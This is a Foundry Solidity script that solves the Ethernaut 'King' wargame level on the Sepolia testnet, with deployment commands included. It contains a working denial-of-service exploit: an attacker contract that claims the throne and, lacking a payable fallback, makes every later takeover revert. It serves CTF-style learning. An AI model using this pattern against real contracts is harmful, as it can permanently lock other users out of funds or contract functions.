// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/King.sol";

/*
    Solution script for the Ethernaut Level 9: King

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in KingScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/King.s.sol:KingScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/King.s.sol/11155111
*/

contract KingAttack {
    function attack(address _target) public payable {
        (bool result,) = _target.call{value: msg.value}("");
        if (!result) revert();
    }

    // intentially missing a payable fallback function to prevent any future King!
}


contract KingScript is Script {
    // replace instance with your level1 instance adddress
    address payable instance = payable(0xf1f30c5870384728a8a66A297A1C853ad5396108);

    function run() external {
        vm.startBroadcast();

        KingAttack attacker = new KingAttack();
        attacker.attack{value: 1000000000000000}(address(instance));

        vm.stopBroadcast();
    }
}